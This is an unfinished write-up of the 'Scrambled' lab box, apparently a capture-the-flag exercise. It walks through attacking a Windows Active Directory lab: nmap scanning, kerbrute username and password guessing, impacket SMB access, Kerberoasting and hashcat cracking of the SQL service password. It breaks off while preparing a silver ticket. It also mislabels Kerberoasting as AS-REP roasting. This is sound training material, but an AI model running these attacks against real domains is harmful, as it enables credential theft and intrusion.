# Box: Scrambled

> damiano gubiani | 15/11/2025
# Enumeration

export box ip

```bash
export IP='10.10.11.168'
```

## NMAP

run on the target an nmap scan

commad:

```bash
sudo nmap -sS -sC -sV -oN nmap/all --open -p - -T4 -vv $IP
```

output:

```
Nmap scan report for 10.10.11.168 (10.10.11.168)
Host is up, received echo-reply ttl 127 (0.10s latency).
Scanned at 2025-11-15 19:56:28 CET for 296s
Not shown: 65513 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-title: Scramble Corp Intranet
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-11-15 18:58:14Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local, Site: Default-First-Site-Name)
|_ssl-date: 2025-11-15T19:01:22+00:00; 0s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC1.scrm.local
| Issuer: commonName=scrm-DC1-CA/domainComponent=scrm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-09-04T11:14:45
| Not valid after:  2121-06-08T22:39:53
| MD5:     2ca2 5511 c96e d5c5 3601 17f2 c316 7ea3
| SHA-1:   9532 78bb e082 70b2 5f2e 7467 6f7d a61d 1918 685e
| SHA-256: 92c7 0b9a 427f b479 ef48 1832 0275 b752 f64c 850b 0c08 cee0 71e4 afc8 55dd 2f87
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local, Site: Default-First-Site-Name)
|_ssl-date: 2025-11-15T19:01:22+00:00; 0s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC1.scrm.local
| Issuer: commonName=scrm-DC1-CA/domainComponent=scrm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-09-04T11:14:45
| Not valid after:  2121-06-08T22:39:53
| MD5:     2ca2 5511 c96e d5c5 3601 17f2 c316 7ea3
| SHA-1:   9532 78bb e082 70b2 5f2e 7467 6f7d a61d 1918 685e
| SHA-256: 92c7 0b9a 427f b479 ef48 1832 0275 b752 f64c 850b 0c08 cee0 71e4 afc8 55dd 2f87
1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info:
|   10.10.11.168:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-11-15T19:01:22+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-15T17:53:55
| Not valid after:  2055-11-15T17:53:55
| MD5:     b84c 5e85 4f38 45e3 8171 9e1d 9743 f3ce
| SHA-1:   0ee1 69c1 143e 3ca1 1c45 67e8 66ee d6e5 a31c f546
| SHA-256: ca6c 1dc0 4b65 2554 6cec 8312 46ff eb7c b5de 97e0 4504 4097 b1c4 74f3 e60f 1c05
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local, Site: Default-First-Site-Name)
|_ssl-date: 2025-11-15T19:01:22+00:00; 0s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC1.scrm.local
| Issuer: commonName=scrm-DC1-CA/domainComponent=scrm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-09-04T11:14:45
| Not valid after:  2121-06-08T22:39:53
| MD5:     2ca2 5511 c96e d5c5 3601 17f2 c316 7ea3
| SHA-1:   9532 78bb e082 70b2 5f2e 7467 6f7d a61d 1918 685e
| SHA-256: 92c7 0b9a 427f b479 ef48 1832 0275 b752 f64c 850b 0c08 cee0 71e4 afc8 55dd 2f87
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: scrm.local, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC1.scrm.local
| Issuer: commonName=scrm-DC1-CA/domainComponent=scrm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-09-04T11:14:45
| Not valid after:  2121-06-08T22:39:53
| MD5:     2ca2 5511 c96e d5c5 3601 17f2 c316 7ea3
| SHA-1:   9532 78bb e082 70b2 5f2e 7467 6f7d a61d 1918 685e
| SHA-256: 92c7 0b9a 427f b479 ef48 1832 0275 b752 f64c 850b 0c08 cee0 71e4 afc8 55dd 2f87
|_ssl-date: 2025-11-15T19:01:22+00:00; 0s from scanner time.
4411/tcp  open  found?        syn-ack ttl 127
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns:
|     SCRAMBLECORP_ORDERS_V1.0.3;
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions:
|     SCRAMBLECORP_ORDERS_V1.0.3;
|_    ERROR_UNKNOWN_COMMAND;
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49716/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49720/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
58487/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC

Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows
```

open ports:

```
80 -> http
139,445 -> SMB
135,5985 -> RPC ,WinRM
389,636,88 -> Kerbers , LDAP
4411 -> idk
```

i added the domain name to my /etc/hosts file

command:

```bash
echo '10.10.11.168 scrm.local dc1.scrm.local' | sudo tee -a /etc/hosts
```

lets start enumerating around

# WebApp

lets check what the web page is holding

the first piece of information we found is this

![[Pasted image 20251115203636.png]]

this means that every authentication try will be done via kerberos

checking the password reset page to check how resets are made

![[Pasted image 20251115205239.png]]

so if a user request a password reset it will be username:username keep this in mind

checking the *contact IT support* page

![[Pasted image 20251115205419.png]]

we get our self 2 possible usernames

>support
>ksimpson

lets try this username in the AD DC

# Kerberos

first off i entered the 2 username in a file called *user* and i passed it to kerbrute tool

command:

```bash
kerbrute userenum -t 16 -d scrm.local --dc $IP -v user
```

![[Pasted image 20251115220048.png]]

seems the ksimpson user exist in the domain , lets try the ksimpson:ksimpson combo since we know that if a password reset is sent the reset will be username:username

command:

```bash
kerbrute bruteuser -d scrm.local --dc $IP -t 16 -v passwd ksimpson
```

![[Pasted image 20251115220236.png]]

NICE ! , we found some valid credentials

> ksimpson:ksimpson

since we know ntlm authentication is disabled we need to pass always by the KDC that we know is dc1.scrm.local

lets try and list al the available share in the smb protocol , i will use smbclient from the impacket suite to make a connection

command:

```bash
smbclient.py 'scrm.local/ksimpson:ksimpson@dc1.scrm.local' -k
```

![[Pasted image 20251115221252.png]]

lets enumerate around this shares

we have access to the Public share and we found a pdf files inside , lets download it

![[Pasted image 20251115222836.png]]

after reading it just confirm what we said earlier , we need to pass from the KDC for any type of authentication

lets run a AS-REP roasting attack on the target

command:

```bash
GetUserSPNs.py -k 'scrm.local'/'ksimpson':'ksimpson' -dc-host dc1.scrm.local
```

![[Pasted image 20251115222547.png]]

we get the hash of the MSSQL service , lets crack it

command:

```bash
hashcat -m 13100 -a 0 sql_svc /opt/tools/wordlist/rockyou.txt
```

and we found the password

> sql_svc:Pegasus60

now that we have the password of a service account we can generate a silver ticket

lets obtain the DC object SID so we can craft the ticket




